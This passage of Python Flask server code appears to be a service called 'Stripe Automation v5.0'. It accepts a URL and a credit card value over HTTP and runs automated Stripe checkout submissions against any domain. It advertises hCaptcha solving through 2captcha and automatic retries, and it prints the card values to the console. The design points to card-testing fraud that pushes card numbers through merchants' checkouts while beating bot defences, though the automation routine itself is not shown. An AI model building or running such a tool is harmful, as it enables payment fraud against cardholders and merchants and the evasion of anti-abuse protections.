    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*80}")
    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[URL] {url[:100]}...")
    print(f"[CC] {cc}")
    print('='*80)
    
    if not url or not cc:
        return jsonify({"error": "Missing parameters: url and cc"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
        print(f"[RESULT] {'✓ SUCCESS' if result.get('success') else '✗ FAILED'}")
        return jsonify(result), 200 if result.get('success') else 400
    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        return jsonify({"error": str(e)}), 500
    finally:
        loop.close()

@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "version": "5.0-request-body-capture",
        "features": {
            "hcaptcha": True,
            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
            "auto_retry": True,
            "universal_api_capture": True,
            "request_body_logging": CONFIG.get("LOG_REQUEST_BODIES", False),
            "fast_mode": CONFIG.get("FAST_MODE", False),
            "all_domains": True
        },
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print("="*80)
    print("[SERVER] Stripe Automation v5.0 - Request Body Capture")
    print(f"[PORT] {port}")
    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
    print(f"[MODE] {'FAST' if CONFIG.get('FAST_MODE') else 'NORMAL'}")
    print(f"[REQUEST BODIES] {'CAPTURING' if CONFIG.get('LOG_REQUEST_BODIES') else 'DISABLED'}")
    print("="*80)
    app.run(host='0.0.0.0', port=port, debug=False)
